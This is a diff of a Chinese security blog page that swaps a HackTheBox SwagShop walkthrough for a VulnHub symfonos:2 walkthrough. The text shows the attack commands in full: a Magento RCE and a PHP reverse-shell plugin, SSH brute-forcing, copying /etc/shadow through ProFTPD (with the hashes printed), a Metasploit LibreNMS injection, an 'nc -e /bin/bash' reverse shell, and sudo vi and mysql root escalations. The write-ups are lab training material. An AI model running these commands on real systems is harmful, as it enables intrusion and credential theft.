@@ -3,24 +3,28 @@
 <head>
   <meta charset="utf-8">
   
-  <title>对SwagShop的测试 | 梦梦的小站</title>
+  <title>对symfonos:2的测试 | 梦梦的小站</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="SwagShop靶机：10.10.10.140kali：10.10.15.83实验目的：找到flag项目地址：https://www.hackthebox.eu/home/machines/profile/188">
+  <meta name="description" content="symfonos:2主机桥接模式实验目的：获取root项目地址：https://www.vulnhub.com/entry/symfonos-2,331/">
 <meta name="keywords" content="安全测试,靶机实验">
 <meta property="og:type" content="article">
-<meta property="og:title" content="对SwagShop的测试">
-<meta property="og:url" content="http://www.lanbainan.cn/2019/07/03/2019-07-03/index.html">
+<meta property="og:title" content="对symfonos:2的测试">
+<meta property="og:url" content="http://www.lanbainan.cn/2019/08/03/2019-08-03/index.html">
 <meta property="og:site_name" content="梦梦的小站">
-<meta property="og:description" content="SwagShop靶机：10.10.10.140kali：10.10.15.83实验目的：找到flag项目地址：https://www.hackthebox.eu/home/machines/profile/188">
+<meta property="og:description" content="symfonos:2主机桥接模式实验目的：获取root项目地址：https://www.vulnhub.com/entry/symfonos-2,331/">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://i.loli.net/2019/07/03/5d1c14b74479798854.png">
-<meta property="og:image" content="https://i.loli.net/2019/07/03/5d1c179fa46ae95785.png">
-<meta property="og:image" content="https://i.loli.net/2019/07/03/5d1c1b77be59d67880.png">
-<meta property="og:updated_time" content="2019-07-03T10:03:38.728Z">
+<meta property="og:image" content="https://i.loli.net/2019/08/03/QB3iyI5aCAVdS82.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/03/uJDyPXQrAKS35GU.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/03/Xyjbf68kDMYoxG5.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/03/TC2UHO1wWuikPtr.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/03/sGcumdZwzvV9ypE.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/03/iV8lbkCNXRIhSos.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/03/iRdrxASKWfMFpgQ.png">
+<meta property="og:updated_time" content="2019-08-03T12:30:54.940Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="对SwagShop的测试">
-<meta name="twitter:description" content="SwagShop靶机：10.10.10.140kali：10.10.15.83实验目的：找到flag项目地址：https://www.hackthebox.eu/home/machines/profile/188">
-<meta name="twitter:image" content="https://i.loli.net/2019/07/03/5d1c14b74479798854.png">
+<meta name="twitter:title" content="对symfonos:2的测试">
+<meta name="twitter:description" content="symfonos:2主机桥接模式实验目的：获取root项目地址：https://www.vulnhub.com/entry/symfonos-2,331/">
+<meta name="twitter:image" content="https://i.loli.net/2019/08/03/QB3iyI5aCAVdS82.png">
   
   
     <link rel="icon" href="/img/830.jpg">
@@ -227,11 +231,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-2019-07-03" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-2019-08-03" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/07/03/2019-07-03/" class="article-date">
-      <time datetime="2019-07-03T01:18:00.000Z" itemprop="datePublished">2019-07-03</time>
+      <a href="/2019/08/03/2019-08-03/" class="article-date">
+      <time datetime="2019-08-03T00:11:00.000Z" itemprop="datePublished">2019-08-03</time>
 </a>
     </div>
   
@@ -244,7 +248,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      对SwagShop的测试
+      对symfonos:2的测试
     </h1>
   
 
@@ -270,17 +274,24 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h1 id="SwagShop"><a href="#SwagShop" class="headerlink" title="SwagShop"></a>SwagShop</h1><p>靶机：10.10.10.140<br>kali：10.10.15.83<br>实验目的：找到flag<br>项目地址：<a href="https://www.hackthebox.eu/home/machines/profile/188" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/188</a><br><a id="more"></a></p>
-<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# masscan -p 0-65535 192.168.67.135 --rate 1000</span><br></pre></td></tr></table></figure>
-<p>开放<code>22</code>,<code>80</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p22,80 10.10.10.140</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)</span><br><span class="line">|_  256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: 88733EE53676A47FC354A61C32516E82</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home page</span><br></pre></td></tr></table></figure></p>
-<p>80端口开放服务，百度可知<br>Magento是一套专业开源的电子商务系统<br><img src="https://i.loli.net/2019/07/03/5d1c14b74479798854.png" alt="1.png"></p>
-<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# searchsploit Magento</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2019/07/03/5d1c179fa46ae95785.png" alt="2.png"><br>令人注意的是由一个远程代码执行,将一些注释和代码修改一下<br><img src="https://i.loli.net/2019/07/03/5d1c1b77be59d67880.png" alt="3.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# python 37977.py</span><br><span class="line">WORKED</span><br><span class="line">Check http://10.10.10.140/admin with creds forme:forme</span><br></pre></td></tr></table></figure></p>
-<p>得到账户密码<code>forme:forme</code><br>后台登录<code>http://10.10.10.140/index.php/admin</code><br>安装<a href="https://github.com/lavalamp-/LavaMagentoBD" target="_blank" rel="noopener">扩展shell</a>,<code>System&gt;Magento Connect&gt;Magento Connect Manager</code>,将<code>app\code\community\Lavalamp\Connector\controllers\IndexController.php</code>内容替换为<code>/usr/share/webshells/php/php-reverse-shell.php</code>并修改IP和端口，重新打包为<code>.tgz</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf bd.tgz app package.xml skin</span><br></pre></td></tr></table></figure></p>
-<p>安装扩展,打开页面<code>http://10.10.10.140/app/code/community/Lavalamp/Connector/controllers/IndexController.php</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ nc -nvlp 4444</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -l</span><br><span class="line">Matching Defaults entries for www-data on swagshop:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on swagshop:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/vi /var/www/html/*</span><br></pre></td></tr></table></figure>
-<p>发现无需密码登录root<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cd /var/www/html/</span><br><span class="line">echo &quot;test&quot; &gt; test</span><br><span class="line">sudo /usr/bin/vi /var/www/html/test -c &apos;!sh&apos;</span><br><span class="line">cat /root/root.txt</span><br><span class="line">c2b087d66e14a652a3b86a130ac56721</span><br><span class="line"></span><br><span class="line">   ___ ___</span><br><span class="line"> /| |/|\| |\</span><br><span class="line">/_| 麓 |.` |_\           We are open! (Almost)</span><br><span class="line">  |   |.  |</span><br><span class="line">  |   |.  |         Join the beta HTB Swag Store!</span><br><span class="line">  |___|.__|       https://hackthebox.store/password</span><br><span class="line"></span><br><span class="line">                   PS: Use root flag as password!</span><br></pre></td></tr></table></figure></p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>在解包打包时，没有查看官方文档，浪费了一定时间，不会就查文档，切记!切记!</p>
+        <h1 id="symfonos-2"><a href="#symfonos-2" class="headerlink" title="symfonos:2"></a>symfonos:2</h1><p>主机桥接模式<br>实验目的：获取root<br>项目地址：<a href="https://www.vulnhub.com/entry/symfonos-2,331/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/symfonos-2,331/</a><br><a id="more"></a></p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><img src="https://i.loli.net/2019/08/03/QB3iyI5aCAVdS82.png" alt="1.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -T4 -A -v -p- 192.168.31.221</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         ProFTPD 1.3.5</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)</span><br><span class="line">|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)</span><br><span class="line">|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)</span><br><span class="line">80/tcp  open  http        WebFS httpd 1.21</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD</span><br><span class="line">|_http-server-header: webfs/1.21</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html).</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)</span><br><span class="line">MAC Address: 08:00:27:B5:39:C4 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Uptime guess: 0.029 days (since Sat Aug  3 01:30:34 2019)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">TCP Sequence Prediction: Difficulty=260 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s</span><br><span class="line">| nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| Names:</span><br><span class="line">|   SYMFONOS2&lt;00&gt;        Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   SYMFONOS2&lt;03&gt;        Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   SYMFONOS2&lt;20&gt;        Flags: &lt;unique&gt;&lt;active&gt;</span><br><span class="line">|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">|_  WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows 6.1 (Samba 4.5.16-Debian)</span><br><span class="line">|   Computer name: symfonos2</span><br><span class="line">|   NetBIOS computer name: SYMFONOS2\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: symfonos2</span><br><span class="line">|_  System time: 2019-08-03T01:12:00-05:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   2.02:</span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2019-08-03 02:12:00</span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure></p>
+<p>ftp不允许匿名登录<br>80端口没有枚举出信息</p>
+<h3 id="Enum4linux"><a href="#Enum4linux" class="headerlink" title="Enum4linux"></a>Enum4linux</h3><p>利用SMB协议枚举Windows系统和SAMBA服务，以此来获得目标系统大量的重要信息，其枚举结果可能包含目标系统的用户帐号、组帐号、共享目录、密码策略等机密重要信息。利用SMB协议枚举Windows系统和SAMBA服务，以此来获得目标系统大量的重要信息，其枚举结果可能包含目标系统的用户帐号、组帐号、共享目录、密码策略等机密重要信息（引用宛老师的话）<br>概况来说：Enum4linux是一个用于枚举Windows和Samba信息的工具<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# enum4linux -a 192.168.31.221</span><br><span class="line">WARNING: The &quot;syslog&quot; option is deprecated</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        anonymous       Disk</span><br><span class="line">        IPC$            IPC       IPC Service (Samba 4.5.16-Debian)</span><br></pre></td></tr></table></figure></p>
+<p>找到一个共享文件夹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# smbclient //192.168.31.221/anonymou</span><br><span class="line">Enter WORKGROUP\root&apos;s password: #空密码</span><br><span class="line">smb: \&gt; ls</span><br><span class="line">smb: \&gt; cd backups</span><br><span class="line">smb: \&gt; get log.txt</span><br></pre></td></tr></table></figure></p>
+<h2 id="枚举密码"><a href="#枚举密码" class="headerlink" title="枚举密码"></a>枚举密码</h2><p>得到一个用户<code>aeolus</code>,22端口可以枚举<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l aeolus -P /usr/share/wordlists/rockyou.txt 192.168.31.221 ssh</span><br></pre></td></tr></table></figure></p>
+<p>但是相对时间太长了，看见<code>ProFTPD 1.3.5</code>，相信也可以利用一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit ProFTPD 1.3.5</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/08/03/uJDyPXQrAKS35GU.png" alt="2.png"><br>此信息与上述漏洞一起使用将<code>shadow</code>放在<code>/home/aeolus/share/backups</code><br><img src="https://i.loli.net/2019/08/03/Xyjbf68kDMYoxG5.png" alt="3.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$VTftENaZ$ggY84BSFETwhissv0N6mt2VaQN9k6/HzwwmTtVkDtTbCbqofFO8MVW.IcOKIzuI07m36uy9.565qelr/beHer.:18095:0:99999:7::</span><br><span class="line">aeolus:$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:18095:0:99999:7:::</span><br><span class="line">cronus:$6$wOmUfiZO$WajhRWpZyuHbjAbtPDQnR3oVQeEKtZtYYElWomv9xZLOhz7ALkHUT2Wp6cFFg1uLCq49SYel5goXroJ0SxU3D/:18095:0:99999:7:::</span><br></pre></td></tr></table></figure></p>
+<p>进行爆破<code>aeolus:sergioteamo</code></p>
+<h2 id="aeolus持续深入"><a href="#aeolus持续深入" class="headerlink" title="aeolus持续深入"></a>aeolus持续深入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">λ ssh aeolus@192.168.31.221</span><br><span class="line">aeolus@symfonos2:~$ id</span><br><span class="line">uid=1000(aeolus) gid=1000(aeolus) groups=1000(aeolus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)</span><br></pre></td></tr></table></figure>
+<p><code>netstat</code>无法使用，惊喜的发现<code>Nmap</code>可以用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">aeolus@symfonos2:~$ nmap -T4 -A -v -p- 127.0.0.1</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">3306/tcp open  mysql       MySQL 5.5.5-10.1.38-MariaDB-0+deb9u1</span><br><span class="line">| mysql-info:</span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.1.38-MariaDB-0+deb9u1</span><br><span class="line">|   Thread ID: 15</span><br><span class="line">|   Capabilities flags: 63487</span><br><span class="line">8080/tcp open  http        Apache httpd 2.4.25 ((Debian))</span><br><span class="line">|_http-favicon: Unknown favicon MD5: B8211E9B75068FB852BFB155D9A1A2EE</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">| http-open-proxy: Potentially OPEN proxy.</span><br><span class="line">|_Methods supported:CONNECTION</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_/</span><br><span class="line">|_http-server-header: Apache/2.4.25 (Debian)</span><br><span class="line">|_http-title: Did not follow redirect to http://localhost/login</span><br></pre></td></tr></table></figure></p>
+<p><code>mysql</code>不慌先，8080端口运行着新的http服务，但是是本机运行，将它转发出来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aeolus@symfonos2:~$ socat -d TCP-LISTEN:1234,fork,reuseaddr tcp:127.0.0.1:8080</span><br></pre></td></tr></table></figure></p>
+<p>效果图<br><img src="https://i.loli.net/2019/08/03/TC2UHO1wWuikPtr.png" alt="4.png"></p>
+<h2 id="利用libreNMS"><a href="#利用libreNMS" class="headerlink" title="利用libreNMS"></a>利用libreNMS</h2><p>这个端口上运行着<code>libreNMS</code><br><img src="https://i.loli.net/2019/08/03/sGcumdZwzvV9ypE.png" alt="5.png"><br>俩都可以用<br>这里使用msf加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/linux/http/librenms_addhost_cmd_inject</span><br><span class="line">msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; show options</span><br><span class="line">msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; set rhosts 192.168.31.221</span><br><span class="line">msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; set rport 1234</span><br><span class="line">msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; set lhost 192.168.31.30</span><br><span class="line">msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; set username aeolus</span><br><span class="line">msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; set msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; set password sergioteamo</span><br><span class="line">msf5 exploit(linux/http/librenms_addhost_cmd_inject) &gt; exploit</span><br><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">cronus@symfonos2:/opt/librenms/html$ id</span><br><span class="line">uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)</span><br></pre></td></tr></table></figure></p>
+<p>不是很会用msf，再次反弹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.31.35 7777</span><br><span class="line">λ nc -nvlp 7777</span><br><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">cronus@symfonos2:/opt/librenms/html$ id</span><br><span class="line">uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)</span><br></pre></td></tr></table></figure></p>
+<h2 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a><a href="https://gtfobins.github.io/gtfobins/mysql/" target="_blank" rel="noopener">mysql提权</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cronus@symfonos2:/home/cronus$ sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/08/03/iV8lbkCNXRIhSos.png" alt="6.png"><br>能root权限运行<code>mysql</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cronus@symfonos2:/home/cronus$ sudo -u root mysql -e &apos;\! /bin/sh&apos;</span><br><span class="line"># id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
+<h2 id="可爱的flag"><a href="#可爱的flag" class="headerlink" title="可爱的flag"></a>可爱的flag</h2><p><img src="https://i.loli.net/2019/08/03/iRdrxASKWfMFpgQ.png" alt="7.png"></p>
 <h1 id="到此结束"><a href="#到此结束" class="headerlink" title="到此结束"></a>到此结束</h1><p>如有错误请联系<a href="mailto:lanbaidetanlang@qq.com" target="_blank" rel="noopener">lanbaidetanlang@qq.com</a></p>
 
       
@@ -291,13 +302,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/07/03/2019-07-03/">对SwagShop的测试</a></p>
+        <p><span>本文标题:</span><a href="/2019/08/03/2019-08-03/">对symfonos:2的测试</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 EV 的个人博客">EV</a></p>
-        <p><span>发布时间:</span>2019年07月03日 - 09时18分</p>
-        <p><span>最后更新:</span>2019年07月03日 - 18时03分</p>
+        <p><span>发布时间:</span>2019年08月03日 - 08时11分</p>
+        <p><span>最后更新:</span>2019年08月03日 - 20时30分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/07/03/2019-07-03/" title="对SwagShop的测试">http://www.lanbainan.cn/2019/07/03/2019-07-03/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://www.lanbainan.cn/2019/07/03/2019-07-03/　　作者: EV" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/08/03/2019-08-03/" title="对symfonos:2的测试">http://www.lanbainan.cn/2019/08/03/2019-08-03/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://www.lanbainan.cn/2019/08/03/2019-08-03/　　作者: EV" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -310,18 +321,9 @@
 
 <nav id="article-nav">
   
-    <a href="/2019/07/04/2019-07-04/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption"><</strong>
-      <div class="article-nav-title">
-        
-          越权小测试
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/06/21/2019-06-21/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">对HTB Netmon的测试</div>
+    <a href="/2019/07/29/2019-07-29/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">对hackme:1的测试</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -333,7 +335,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SwagShop"><span class="toc-number">1.</span> <span class="toc-text">SwagShop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01"><span class="toc-number">1.1.</span> <span class="toc-text">0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02"><span class="toc-number">1.2.</span> <span class="toc-text">0x02</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#后记"><span class="toc-number">2.</span> <span class="toc-text">后记</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#到此结束"><span class="toc-number">3.</span> <span class="toc-text">到此结束</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#symfonos-2"><span class="toc-number">1.</span> <span class="toc-text">symfonos:2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#信息收集"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Enum4linux"><span class="toc-number">1.1.1.</span> <span class="toc-text">Enum4linux</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#枚举密码"><span class="toc-number">1.2.</span> <span class="toc-text">枚举密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#aeolus持续深入"><span class="toc-number">1.3.</span> <span class="toc-text">aeolus持续深入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用libreNMS"><span class="toc-number">1.4.</span> <span class="toc-text">利用libreNMS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql提权"><span class="toc-number">1.5.</span> <span class="toc-text">mysql提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#可爱的flag"><span class="toc-number">1.6.</span> <span class="toc-text">可爱的flag</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#到此结束"><span class="toc-number">2.</span> <span class="toc-text">到此结束</span></a></li></ol>
 </div>
 <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
 
@@ -412,13 +414,11 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/07/04/2019-07-04/" title="上一篇: 越权小测试">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
